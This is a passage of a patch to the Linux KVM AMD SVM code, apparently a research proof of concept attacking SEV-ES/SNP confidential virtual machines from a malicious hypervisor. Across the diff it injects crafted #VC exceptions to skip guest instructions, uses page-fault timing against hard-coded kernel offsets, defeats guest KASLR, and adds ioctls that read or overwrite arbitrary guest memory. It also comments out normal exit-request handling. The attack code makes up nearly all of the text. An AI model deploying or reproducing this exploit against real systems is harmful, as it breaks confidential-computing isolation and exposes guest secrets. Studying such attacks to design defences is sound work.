++		deadlock_count++;
++	}
++	if (deadlock_count > 0x1000){
++		resume_count++;
++		if (resume_count >= 0x100){
++			deadlock_count = 0;
++			resume_count = 0;
++		}
++		return;
++	}
++
++	// somehow we get a perma loop here, not sure why
++	if (user_data_npf_ex.scheduler_tick){
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.scheduler_tick >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.scheduler_tick+0x1000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.scheduler_tick+0x2000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.scheduler_tick+0x3000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.scheduler_tick+0x4000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.scheduler_tick+0x5000) >> 12, true);
++	}
++
++	if (user_data_npf_ex.update_rq_clock_part_0){
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.update_rq_clock_part_0 >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.update_rq_clock_part_0-0x1000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.update_rq_clock_part_0-0x2000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.update_rq_clock_part_0-0x3000) >> 12, true);
++		kvm_vcpu_exec_protect_gfn(vcpu, (user_data_npf_ex.update_rq_clock_part_0-0x5000) >> 12, true);
++	}
++
++}
++
++void profile_pages_and_skip_on_ip_update(struct kvm_vcpu *vcpu){
++	struct vcpu_svm *svm = to_svm(vcpu);
++	u64 fault_address = svm->vmcb->control.exit_info_2;
++	static u64 previous_fault_address = 1;
++	static u64 previous_previous_fault_address = 1;
++
++	if (previous_previous_fault_address == user_data_npf_ex.vc_handle_exitcode_page && 
++		previous_fault_address == user_data_npf_ex.sev_put_ghcb_page && 
++		fault_address == user_data_npf_ex.vc_handle_exitcode_page){
++		// initialize skip counter to 0;
++		user_data_npf_ex.skip_counter = 0;
++		user_data_npf_ex.state_skipping = VC__FAULT_ON_BASE;
++		previous_fault_address = 1;
++		previous_previous_fault_address = 1;
++		// inject Inst skip VC
++		user_data_npf_ex.exception_number = 29;
++		user_data_npf_ex.exception_error_code = 0x81;
++		atomic_set(&user_data_npf_ex.deliver_intr, 2);
++		user_data_npf_ex.instruction_skip_rdtsc = rdtsc();
++		user_data_npf_ex.instruction_skip_ns = ktime_get_ns();
++		return;
++	}
++
++	if (fault_address == user_data_npf_ex.vc_handle_exitcode_page){
++		VC_pr_info("hit vc_handle_exitcode_page");
++	}
++	if (fault_address == user_data_npf_ex.sev_put_ghcb_page){
++		VC_pr_info("hit sev_put_ghcb_page");
++	}
++	
++
++	kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_handle_exitcode_page >> 12, true);
++	kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.sev_put_ghcb_page >> 12, true);
++	kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_do_mmio >> 12, true);
++
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && fault_address){
++		previous_previous_fault_address = previous_fault_address;
++		previous_fault_address = fault_address;
++	}
++}
++
++
++void exploit_function_post_run(struct kvm_vcpu *vcpu){
++	struct vcpu_svm *svm = to_svm(vcpu);
++
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && svm->vmcb->control.exit_info_2){
++		if (user_data_npf_ex.state == VC_WAIT_FOR_RETURN_OF_SECOND_VC_INJ){
++			//pr_info("jump_skip active %llx\n",user_data_npf_ex.vc_return_address);
++			if (svm->vmcb->control.exit_info_2 == user_data_npf_ex.vc_return_address){
++				kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_do_mmio >> 12, true);
++				user_data_npf_ex.state = VC_WAITING_FOR_IP_TO_HIT_JE_IN_DO_MMIO;
++				VC_pr_info("reached end of VC (probably)\n");
++			}
++		}
++		if (user_data_npf_ex.state == VC_WAITING_FOR_IP_TO_HIT_JE_IN_DO_MMIO){
++			if (svm->vmcb->control.exit_info_2 == user_data_npf_ex.vc_do_mmio){
++				VC_pr_info("skipping je to proceed without exception\n");
++				user_data_npf_ex.exception_number = 29;
++				user_data_npf_ex.exception_error_code = 0x81;
++				atomic_set(&user_data_npf_ex.deliver_intr, 2);
++				user_data_npf_ex.state = VC_INJECT_VC_TO_SKIP_JMP;
++			}
++		}
++	}
++
++	// hmmm, somehow the write thing got stable. So we can overwrite stuff pretty now.
++	if (user_data_npf_ex.do_read)
++		profile_pages_and_fault_on_mov_read(vcpu);
++	else
++		profile_pages_and_fault_on_mov_write(vcpu);
++	
++	if(user_data_npf_ex.state >= VC_STOPPED_ON_MOV){
++		// in case we get a physical timer etc. delay the injection until the previous injection went through.
++		//* Should not happen with the new architecture.
++		if (user_data_npf_ex.state == VC_STOPPED_ON_MOV && !atomic_read(&user_data_npf_ex.deliver_intr)){
++			// inject MMIO VC
++			user_data_npf_ex.exception_number = 29;
++			user_data_npf_ex.exception_error_code = 0x400;
++			atomic_set(&user_data_npf_ex.deliver_intr, 2);
++
++			user_data_npf_ex.state = VC_INJECTED_VC_400;
++			VC_pr_info("about to inject VC 29 with errorcode 0x400\n");
++		}
++		if (user_data_npf_ex.state == VC_INJECTED_VC_400){
++			profile_pages_and_inject_VC_first(vcpu);
++		}
++		// we need to mark the pages NX on VC_INJECTED_RAX_PTR_LEAK_INTO_VC
++		// if we would only do it on VC_PROFILE_FOR_SECOND_INJECT_INTO_VC we would enter the guest with these pages
++		// marked as executable and only on the next exit we would mark them as NX
++		// by that time it is to late and we probably passed by our injection point
++		if (user_data_npf_ex.state == VC_PROFILE_FOR_SECOND_INJECT_INTO_VC){
++			profile_pages_and_inject_VC_second(vcpu);
++		}
++	}
++	if (user_data_npf_ex.state_skipping == VC__START_PROFILING){
++		profile_pages_and_skip_on_ip_update(vcpu);
++	}
++
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && svm->vmcb->control.exit_info_2){
++		if (user_data_npf_ex.state_skipping == VC__WAIT_FOR_END_OF_VC){
++			//pr_info("jump_skip active %llx\n",user_data_npf_ex.vc_return_address);
++			if (svm->vmcb->control.exit_info_2 == user_data_npf_ex.vc_return_address){
++				user_data_npf_ex.state_skipping = VC__WAIT_FOR_FAUL_ON_HANDLE_EXITCODE;
++				VC_pr_profile("skip instruction duration rdtsc %lld\n",rdtsc()-user_data_npf_ex.instruction_skip_rdtsc);
++				VC_pr_profile("skip instruction duration ns %lld\n",ktime_get_ns()-user_data_npf_ex.instruction_skip_ns);
++				user_data_npf_ex.skip_counter++;
++				if (user_data_npf_ex.skip_counter != 15){
++					kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_handle_exitcode_page >> 12, true);
++					VC_pr_info("reached end of VC (probably) marking vc_handle_exitcode_page as NX\n");
++				} else {
++					user_data_npf_ex.state_skipping = VC__SKIP_IDLE;
++					user_data_npf_ex.state++;
++					// since we use it two times, just increase the state by 1 point.
++					if (user_data_npf_ex.state == VC_END) {
++						user_data_npf_ex.state = user_data_npf_ex.block_on_page ? VC_BLOCK_ON_MOV : VC_IDLE;
++					}
++				}
++			}
++		}
++		if (user_data_npf_ex.state_skipping == VC__WAIT_FOR_FAUL_ON_HANDLE_EXITCODE){
++			if (svm->vmcb->control.exit_info_2 == user_data_npf_ex.vc_handle_exitcode_page){
++				VC_pr_info("skipping instruction\n");
++				user_data_npf_ex.exception_number = 29;
++				user_data_npf_ex.exception_error_code = 0x81;
++				atomic_set(&user_data_npf_ex.deliver_intr, 2);
++				user_data_npf_ex.instruction_skip_rdtsc = rdtsc();
++				user_data_npf_ex.instruction_skip_ns = ktime_get_ns();
++				user_data_npf_ex.state_skipping = VC__FAULT_ON_BASE;
++			}
++		}
++		if (user_data_npf_ex.state == VC_WAIT_INJECT_VC_TO_SKIP_JMP_RETURNED){
++			// when we reach here, the previous vmmcall VC exited and we are returning to the MMIO VC context
++			if (svm->vmcb->control.exit_info_2 == user_data_npf_ex.vc_return_address){
++				user_data_npf_ex.state = VC_SWITCH_TO_SKIPPING_STATE_SECOND;
++				user_data_npf_ex.state_skipping = VC__START_PROFILING;
++				// after here we must fault on vc_raw_handle_exception and sev_put_ghcd.
++				// This might not work for MMIO Write since we do a MEMCPY AFTER this
++				// and the mmecopy might be on the same page as vc_handle_exitcode_page.
++				kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_handle_exitcode_page >> 12, true);
++				kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.sev_put_ghcb_page >> 12, true);
++				// ned this to avoid false positive hit (can be optimized if we profile which pages actually cause the false positive)
++				//kvm_start_tracking(vcpu);
++			}
++		}
++	}
++}
++
+ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
+ {
+ 	struct vcpu_svm *svm = to_svm(vcpu);
+@@ -4063,6 +4367,43 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
+ 		smp_send_reschedule(vcpu->cpu);
+ 	}
+ 
++	if (user_data_npf_ex.state == VC_BLOCK_ON_MOV){
++		// block for write 
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.scheduler_tick >> 12, true);
++		// block for read
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.update_rq_clock >> 12, true);
++	}
++	
++	// start at VM exit, so we block all other interrupts which migh mess up or state.
++	// done in x86/kvm/x86.c
++	if (user_data_npf_ex.start){
++		if (user_data_npf_ex.state == VC_IDLE){
++			user_data_npf_ex.state = VC_WAITING_FOR_UNDERLYING_MOV;
++			user_data_npf_ex.state_skipping = VC__SKIP_IDLE;
++			// we need to mark all pages as not executable
++			// otherwise we might get a false positive hit in the
++			// second run on update_rq_clock.
++			kvm_start_tracking(vcpu,false);
++		}
++		if (user_data_npf_ex.state == VC_BLOCK_ON_MOV){
++			user_data_npf_ex.state = VC_STOPPED_ON_MOV;
++			user_data_npf_ex.state_skipping = VC__SKIP_IDLE;
++		}
++		user_data_npf_ex.start = false;
++	}
++
++	if(atomic_read(&user_data_npf_ex.user_interrupt_pending) == 1){
++		svm->vmcb->control.event_inj = user_data_npf_ex.exception_number | SVM_EVTINJ_VALID | SVM_EVTINJ_VALID_ERR | SVM_EVTINJ_TYPE_INTR;
++		svm->vmcb->control.event_inj_err = user_data_npf_ex.exception_error_code;
++		VC_pr_info("before run: event_inj %x\n",svm->vmcb->control.event_inj);
++		VC_pr_info("before run: event_inj_err %x\n",svm->vmcb->control.event_inj_err);
++	}
++	
++	if(user_data_npf_ex.state == VC_WAIT_FOR_KASLR_PAGE_FAULT && svm->vmcb->control.exit_info_2 != user_data_npf_ex.x86_64_start_kernel){
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.x86_64_start_kernel >> 12, true);
++	}
++
++
+ 	pre_svm_run(vcpu);
+ 
+ 	sync_lapic_to_cr8(vcpu);
+@@ -4117,6 +4458,28 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
+ 	kvm_load_host_xsave_state(vcpu);
+ 	stgi();
+ 
++	if(atomic_read(&user_data_npf_ex.user_interrupt_pending) == 1){
++		atomic_set(&user_data_npf_ex.user_interrupt_pending,0);
++		user_data_npf_ex.generic_vc_counter++;
++	}
++	
++	if (user_data_npf_ex.state > VC_IDLE)
++		exploit_function_post_run(vcpu);
++
++	if (user_data_npf_ex.state == VC_WAIT_FOR_KASLR_PAGE_FAULT){
++		if (svm->vmcb->control.exit_info_2 == user_data_npf_ex.x86_64_start_kernel){
++			if (user_data_npf_ex.generic_page_counter == 4){
++				// this VC will only skip a ENDBR instruction, so we don't care at all
++				user_data_npf_ex.exception_number = 29;
++				user_data_npf_ex.exception_error_code = 0x81;
++				atomic_set(&user_data_npf_ex.deliver_intr, 2);
++				user_data_npf_ex.state = VC_WAIT_FOR_VMEXIT_WITH_KASLR_ADDR;
++			} else{
++				user_data_npf_ex.generic_page_counter++;
++			}
++		}
++	}
++
+ 	/* Any pending NMI will happen here */
+ 
+ 	if (unlikely(svm->vmcb->control.exit_code == SVM_EXIT_NMI))
+@@ -4161,6 +4524,7 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
+ 	if (is_guest_mode(vcpu))
+ 		return EXIT_FASTPATH_NONE;
+ 
++	//pr_info("0x%x\n",svm->vmcb->control.exit_code);
+ 	return svm_exit_handlers_fastpath(vcpu);
+ }
+ 
+@@ -5137,9 +5501,8 @@ static __init int svm_hardware_setup(void)
+ 
+ 	/* Force VM NPT level equal to the host's paging level */
+ 	kvm_configure_mmu(npt_enabled, get_npt_level(),
+-			  get_npt_level(), PG_LEVEL_1G);
++			  get_npt_level(), PG_LEVEL_4K);
+ 	pr_info("Nested Paging %sabled\n", npt_enabled ? "en" : "dis");
+-
+ 	/* Setup shadow_me_value and shadow_me_mask */
+ 	kvm_mmu_set_me_spte_mask(sme_me_mask, sme_me_mask);
+ 
+diff --git a/arch/x86/kvm/x86.c b/arch/x86/kvm/x86.c
+index 7eaf69e63d2b..f8ffa7a514c9 100644
+--- a/arch/x86/kvm/x86.c
++++ b/arch/x86/kvm/x86.c
+@@ -61,6 +61,7 @@
+ #include <linux/entry-kvm.h>
+ #include <linux/suspend.h>
+ #include <linux/smp.h>
++#include <linux/intr_injection.h>
+ 
+ #include <trace/events/ipi.h>
+ #include <trace/events/kvm.h>
+@@ -10491,6 +10492,31 @@ EXPORT_SYMBOL_GPL(__kvm_request_immediate_exit);
+  * exiting to the userspace.  Otherwise, the value will be returned to the
+  * userspace.
+  */
++
++struct npf_exception_coordination user_data_npf_ex = {
++	.deliver_intr = ATOMIC_INIT(0),
++	.user_interrupt_pending = ATOMIC_INIT(0),
++	.start = false,
++	.state = VC_INIT,
++	.insn_get_modrm_reg_ptr_gpa = 0xe6b320,
++	.vc_handle_mmio_gpa = 0xe164a,
++	.update_rq_clock = 0x12fc90,
++	.sched_clock_cpu = 0x150540,
++	.lookup_address_in_pgd = 0xe94b0,
++	.vc_do_mmio = 0xdfae0,
++	.vc_return_address = 0xe7170c,
++	.x86_64_start_kernel = 0x248eb80,
++	.scheduler_tick = 0x13a140,
++	.update_rq_clock_part_0 = 0x12fca0, // can omit technically, but keep it in case alignment changes
++	.vc_handle_exitcode_page = 0xe1d15,
++	.sev_put_ghcb_page = 0xe70c20, 
++	.getrandom_syscall_addr = 0x693600,
++	.vc_handle_exitcode_page_part_1 = 0xe0ecb,
++	.block_on_page = false,
++};
++EXPORT_SYMBOL(user_data_npf_ex);
++extern bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb);
++
+ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ {
+ 	int r;
+@@ -10656,32 +10682,42 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 		}
+ 	}
+ 
+-	if (kvm_check_request(KVM_REQ_EVENT, vcpu) || req_int_win ||
+-	    kvm_xen_has_interrupt(vcpu)) {
+-		++vcpu->stat.req_event;
+-		r = kvm_apic_accept_events(vcpu);
+-		if (r < 0) {
+-			r = 0;
+-			goto out;
+-		}
+-		if (vcpu->arch.mp_state == KVM_MP_STATE_INIT_RECEIVED) {
+-			r = 1;
+-			goto out;
+-		}
++	if ((((kvm_check_request(KVM_REQ_EVENT, vcpu) || req_int_win ||
++	    kvm_xen_has_interrupt(vcpu))) || atomic_read(&user_data_npf_ex.deliver_intr)) 
++		&& !atomic_read(&user_data_npf_ex.user_interrupt_pending)) {
++		
++		if (atomic_read(&user_data_npf_ex.deliver_intr)) {
++			atomic_set(&user_data_npf_ex.deliver_intr,0);
++			atomic_set(&user_data_npf_ex.user_interrupt_pending,1);
++		} else if (!(user_data_npf_ex.state > VC_WAITING_FOR_UNDERLYING_MOV)) {
++			++vcpu->stat.req_event;
++			r = kvm_apic_accept_events(vcpu);
++			if (r < 0) {
++				r = 0;
++				goto out;
++			}
++			if (vcpu->arch.mp_state == KVM_MP_STATE_INIT_RECEIVED) {
++				r = 1;
++				goto out;
++			}
+ 
+-		r = kvm_check_and_inject_events(vcpu, &req_immediate_exit);
+-		if (r < 0) {
+-			r = 0;
+-			goto out;
+-		}
+-		if (req_int_win)
+-			static_call(kvm_x86_enable_irq_window)(vcpu);
++			r = kvm_check_and_inject_events(vcpu, &req_immediate_exit);
++			if (r < 0) {
++				r = 0;
++				goto out;
++			}
++			if (req_int_win)
++				static_call(kvm_x86_enable_irq_window)(vcpu);
+ 
+-		if (kvm_lapic_enabled(vcpu)) {
+-			update_cr8_intercept(vcpu);
+-			kvm_lapic_sync_to_vapic(vcpu);
++			if (kvm_lapic_enabled(vcpu)) {
++				update_cr8_intercept(vcpu);
++				kvm_lapic_sync_to_vapic(vcpu);
++			}
+ 		}
+ 	}
++/* 	if (user_data_npf_ex.activate_guest_lock_on_mov_boundary){
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.update_rq_clock >> 12, true);
++	} */
+ 
+ 	r = kvm_mmu_reload(vcpu);
+ 	if (unlikely(r)) {
+@@ -10728,7 +10764,9 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 	if (kvm_lapic_enabled(vcpu))
+ 		static_call_cond(kvm_x86_sync_pir_to_irr)(vcpu);
+ 
+-	if (kvm_vcpu_exit_request(vcpu)) {
++	// we skip all requests, however, this checks for pending requests and exits
++	// so just uncomment it
++/* 	if (kvm_vcpu_exit_request(vcpu)) {
+ 		vcpu->mode = OUTSIDE_GUEST_MODE;
+ 		smp_wmb();
+ 		local_irq_enable();
+@@ -10736,7 +10774,7 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 		kvm_vcpu_srcu_read_lock(vcpu);
+ 		r = 1;
+ 		goto cancel_injection;
+-	}
++	} */
+ 
+ 	if (req_immediate_exit) {
+ 		kvm_make_request(KVM_REQ_EVENT, vcpu);
+@@ -10769,6 +10807,7 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 		 * per-VM state, and responsing vCPUs must wait for the update
+ 		 * to complete before servicing KVM_REQ_APICV_UPDATE.
+ 		 */
++
+ 		WARN_ON_ONCE((kvm_vcpu_apicv_activated(vcpu) != kvm_vcpu_apicv_active(vcpu)) &&
+ 			     (kvm_get_apic_mode(vcpu) != LAPIC_MODE_DISABLED));
+ 
+@@ -12304,14 +12343,16 @@ int kvm_arch_init_vm(struct kvm *kvm, unsigned long type)
+ 		return -EINVAL;
+ 
+ 	kvm->arch.vm_type = type;
+-
++	pr_info("init vm\n");
+ 	ret = kvm_page_track_init(kvm);
+ 	if (ret)
+ 		goto out;
+ 
++	pr_info("before mmu init\n");
+ 	ret = kvm_mmu_init_vm(kvm);
+ 	if (ret)
+ 		goto out_page_track;
++	pr_info("before mmu init\n");
+ 
+ 	ret = static_call(kvm_x86_vm_init)(kvm);
+ 	if (ret)
+diff --git a/include/linux/intr_injection.h b/include/linux/intr_injection.h
+new file mode 100644
+index 000000000000..e0ffe31267d0
+--- /dev/null
++++ b/include/linux/intr_injection.h
+@@ -0,0 +1,129 @@
++/* SPDX-License-Identifier: GPL-2.0 */
++
++#ifndef _LINUX_INTR_INJ_H
++#define _LINUX_INTR_INJ_H
++
++/*
++ *	Generic Interrupt injection support
++ */
++
++#include <linux/errno.h>
++#include <linux/types.h>
++#include <linux/list.h>
++#include <linux/cpumask.h>
++#include <linux/init.h>
++
++//#define VC_pr_info(...) pr_info(__VA_ARGS__)
++#define VC_pr_info(...)
++
++#define VC_pr_profile(...) pr_info(__VA_ARGS__)
++//#define VC_pr_profile(...)
++
++enum exploit_state {
++	VC_INIT,
++	VC_WAIT_FOR_KASLR_PAGE_FAULT,
++	VC_WAIT_FOR_VMEXIT_WITH_KASLR_ADDR,
++	VC_IDLE,
++	VC_WAITING_FOR_UNDERLYING_MOV,
++	VC_BLOCK_ON_MOV,
++	VC_STOPPED_ON_MOV,
++	VC_INJECTED_VC_400,
++	VC_INJECTED_RAX_PTR_LEAK_INTO_VC,
++	VC_SWITCH_TO_SKIPPING_STATE_FIRST,
++	VC_PROFILE_FOR_SECOND_INJECT_INTO_VC,
++	VC_INJECTED_SECOND_VC_INTO_VC,
++	VC_WAIT_FOR_RETURN_OF_SECOND_VC_INJ,
++	VC_WAITING_FOR_IP_TO_HIT_JE_IN_DO_MMIO,
++	VC_INJECT_VC_TO_SKIP_JMP,
++	VC_WRITE_HACK_WAIT_FOR_EXITCODE_PAGE_HIT,
++	VC_WAIT_INJECT_VC_TO_SKIP_JMP_RETURNED,
++	VC_SWITCH_TO_SKIPPING_STATE_SECOND,
++	VC_END,
++};
++
++enum skip_state {
++	VC__SKIP_IDLE,
++	VC__START_PROFILING,
++	VC__FAULT_ON_BASE,
++	VC__WAIT_FOR_END_OF_VC,
++	VC__WAIT_FOR_FAUL_ON_HANDLE_EXITCODE,
++};
++
++struct npf_exception_coordination{
++	enum exploit_state state;
++	enum skip_state state_skipping;
++	uint64_t skip_counter;
++
++	bool start;
++
++	uint64_t generic_page_counter;
++	
++	atomic_t deliver_intr;
++	atomic_t user_interrupt_pending;
++	// actual exception number
++	uint32_t exception_number;
++	uint32_t exception_error_code;
++
++	// this is the gpa we use to inject the second VC.
++	uint64_t insn_get_modrm_reg_ptr_gpa;
++	// this is the gpa we use to inject the second VC.
++	uint64_t vc_handle_mmio_gpa;
++	// function such that we can inject our VC on mov rax,rdx.
++	uint64_t update_rq_clock;
++	// on return from that function to update_rq_clock we inject our VC's.
++	uint64_t sched_clock_cpu;
++	// address we want to leak
++	uint64_t leak_addr;
++	// data to copy in or copy out
++	uint64_t data_user;
++
++	// pf on this one to overwrite dst virtual addr pointer
++	uint64_t lookup_address_in_pgd;
++	// if we return from lookup address in pdg to this one inject VC
++	uint64_t vc_do_mmio;
++
++	// save pointer to rax on the VC 29/400 stack, such that we can 
++	// abuse the value.
++	uint64_t valid_virtual_address_pointing_to_rax_register;
++	// doen't mean we will return from VC directly on the same page are also
++	// __sev_put_ghcb and __sev_es_nmi_complete, but its a good indication
++	// also entry point for normal page faults is on that address.
++
++	//* changed it now to point to ct_nmi_exit calledj 
++	//* However functions such as __memcpy are on the same page
++	uint64_t vc_return_address;
++	uint64_t physical_base_addr_kernel;
++	// now we defeat virtual KASLR
++	uint64_t x86_64_start_kernel; 	// 0x248e000 diff to base
++	uint64_t virtual_base_addr_kernel;
++	// 0x1d7cbc0 core_pattern offset from base
++	
++	uint64_t scheduler_tick; 	//ffffffff8113a140 ....0x13a140 diff to base
++	uint64_t update_rq_clock_part_0; 	// ffffffff8112fca0 ....0x12fca0 diff to base
++
++	// we need this to skip the instruction skip.
++	uint64_t vc_handle_exitcode_page; // 0xe1d15 offset 
++	uint64_t sev_put_ghcb_page; // 0xe70c20 offset 
++
++	bool do_read;
++
++	uint64_t vc_handle_exitcode_page_part_1;
++
++	uint64_t getrandom_syscall_addr; // 0x693600
++	uint64_t get_random_return_val;
++
++	uint64_t instruction_skip_rdtsc;
++	uint64_t instruction_skip_ns;
++	bool block_on_page;
++
++	uint64_t page_fault_count_till_vmlinux_switch;
++
++	uint64_t generic_page_fault_counter;
++
++	uint64_t generic_vc_counter;
++	
++};
++
++extern struct npf_exception_coordination user_data_npf_ex;
++
++#endif //_LINUX_INTR_INJ_H
+\ No newline at end of file
+diff --git a/include/uapi/linux/kvm.h b/include/uapi/linux/kvm.h
+index e7514c29218f..219164b7d167 100644
+--- a/include/uapi/linux/kvm.h
++++ b/include/uapi/linux/kvm.h
+@@ -947,11 +947,29 @@ struct kvm_ppc_resize_hpt {
+ #define KVM_VM_TYPE_ARM_IPA_SIZE_MASK	0xffULL
+ #define KVM_VM_TYPE_ARM_IPA_SIZE(x)		\
+ 	((x) & KVM_VM_TYPE_ARM_IPA_SIZE_MASK)
++
++struct kvm_vc_leak {
++	__u64 leak_addr;
++	__u64 leak_data;
++	__u8 read;
++	__u64 virtual_kaslr_base;
++	__u64 physcial_kaslr_base;
++};
++	
+ /*
+  * ioctls for /dev/kvm fds:
+  */
+ #define KVM_GET_API_VERSION       _IO(KVMIO,   0x00)
+ #define KVM_CREATE_VM             _IO(KVMIO,   0x01) /* returns a VM fd */
++#define KVM_VC_SET_STUFF             _IOW(KVMIO,   0x11, struct kvm_vc_leak)
++#define KVM_VC_GET_STUFF             _IOR(KVMIO,   0x12, struct kvm_vc_leak)
++#define KVM_VC_GET_KASLR             _IOR(KVMIO,   0x13, struct kvm_vc_leak)
++#define KVM_VC_WRITE_LOCK             _IO(KVMIO,   0x14)
++#define KVM_VC_WRITE_UNLOCK             _IO(KVMIO,   0x15)
++#define KVM_VC_SET_PF_CNT             _IO(KVMIO,   0x16)
++#define KVM_VC_GET_PF_CNT             _IO(KVMIO,   0x17)
++#define KVM_VC_SET_VC_CNT             _IO(KVMIO,   0x18)
++#define KVM_VC_GET_VC_CNT             _IO(KVMIO,   0x19)
+ #define KVM_GET_MSR_INDEX_LIST    _IOWR(KVMIO, 0x02, struct kvm_msr_list)
+ 
+ #define KVM_S390_ENABLE_SIE       _IO(KVMIO,   0x06)
+diff --git a/reload.sh b/reload.sh
+new file mode 100755
+index 000000000000..96d7da1e630a
+--- /dev/null
++++ b/reload.sh
+@@ -0,0 +1,4 @@
++#!/bin/bash
++
++sudo rmmod kvm_amd kvm
++sudo modprobe kvm_amd
+diff --git a/remake_kvm.sh b/remake_kvm.sh
+new file mode 100755
+index 000000000000..502e48d3cbf7
+--- /dev/null
++++ b/remake_kvm.sh
+@@ -0,0 +1,9 @@
++#!/bin/bash
++
++make -j32
++sudo make modules_install -j32
++sudo rmmod kvm_amd
++sudo rmmod kvm
++sudo make headers_install INSTALL_HDR_PATH=/usr/
++sudo modprobe kvm
++sudo modprobe kvm_amd
+diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
+index 4a891f70230f..0cb047fbe4dd 100644
+--- a/virt/kvm/kvm_main.c
++++ b/virt/kvm/kvm_main.c
+@@ -52,11 +52,20 @@
+ #include <linux/lockdep.h>
+ #include <linux/kthread.h>
+ #include <linux/suspend.h>
++#include <linux/intr_injection.h>
+ 
+ #include <asm/processor.h>
+ #include <asm/ioctl.h>
+ #include <linux/uaccess.h>
+ 
++// For file stuff
++#include <linux/fs.h>
++#include <asm/segment.h>
++#include <asm/uaccess.h>
++#include <linux/buffer_head.h>
++#include <asm/tlbflush.h>
++// ----------------
++
+ #include "coalesced_mmio.h"
+ #include "async_pf.h"
+ #include "kvm_mm.h"
+@@ -1213,7 +1222,7 @@ static struct kvm *kvm_create_vm(unsigned long type, const char *fdname)
+ 
+ 	if (!kvm)
+ 		return ERR_PTR(-ENOMEM);
+-
++	pr_info("creating VM\n");
+ 	/* KVM is pinned via open("/dev/kvm"), the fd passed to this ioctl(). */
+ 	__module_get(kvm_chardev_ops.owner);
+ 
+@@ -1279,10 +1288,10 @@ static struct kvm *kvm_create_vm(unsigned long type, const char *fdname)
+ 			goto out_err_no_arch_destroy_vm;
+ 	}
+ 
++	pr_info("before init\n");
+ 	r = kvm_arch_init_vm(kvm, type);
+ 	if (r)
+ 		goto out_err_no_arch_destroy_vm;
+-
+ 	r = hardware_enable_all();
+ 	if (r)
+ 		goto out_err_no_disable;
+@@ -1295,6 +1304,7 @@ static struct kvm *kvm_create_vm(unsigned long type, const char *fdname)
+ 	if (r)
+ 		goto out_err_no_mmu_notifier;
+ 
++	pr_info("after mmu not\n");
+ 	r = kvm_coalesced_mmio_init(kvm);
+ 	if (r < 0)
+ 		goto out_no_coalesced_mmio;
+@@ -4321,6 +4331,28 @@ static int kvm_vcpu_ioctl_get_stats_fd(struct kvm_vcpu *vcpu)
+ 	return fd;
+ }
+ 
++
++struct file *file_open(const char *path, int flags, int rights)
++{
++    struct file *filp = NULL;
++    int err = 0;
++
++
++    filp = filp_open(path, flags, rights);
++    if (IS_ERR(filp)) {
++        err = PTR_ERR(filp);
++        return NULL;
++    }
++    return filp;
++}
++
++struct file *trace_dump_tmp;
++EXPORT_SYMBOL(trace_dump_tmp);
++
++long kvm_start_tracking(struct kvm_vcpu *vcpu, bool init);
++extern int kvm_mmu_reload(struct kvm_vcpu *vcpu);
++
++
+ static long kvm_vcpu_ioctl(struct file *filp,
+ 			   unsigned int ioctl, unsigned long arg)
+ {
+@@ -4329,6 +4361,7 @@ static long kvm_vcpu_ioctl(struct file *filp,
+ 	int r;
+ 	struct kvm_fpu *fpu = NULL;
+ 	struct kvm_sregs *kvm_sregs = NULL;
++	static uint64_t should_flush = 0;
+ 
+ 	if (vcpu->kvm->mm != current->mm || vcpu->kvm->vm_dead)
+ 		return -EIO;
+@@ -4349,6 +4382,19 @@ static long kvm_vcpu_ioctl(struct file *filp,
+ 	switch (ioctl) {
+ 	case KVM_RUN: {
+ 		struct pid *oldpid;
++		// We flush on first run of vcpu
++		// Have to reload the module to flush again
++		should_flush++;
++		if (should_flush == 1) {
++			kvm_start_tracking(vcpu, true);
++			user_data_npf_ex.page_fault_count_till_vmlinux_switch = 0;
++			trace_dump_tmp = file_open("/tmp/debuglog", O_CREAT | O_RDWR, 0666);
++			if (trace_dump_tmp == NULL) {
++				printk("Failed to open file\n");
++				return -EINVAL;
++			}
++		}
++
+ 		r = -EINVAL;
+ 		if (arg)
+ 			goto out;
+@@ -5369,6 +5415,82 @@ static int kvm_dev_ioctl_create_vm(unsigned long type)
+ 	return r;
+ }
+ 
++static long lock_write_mov_page(void){
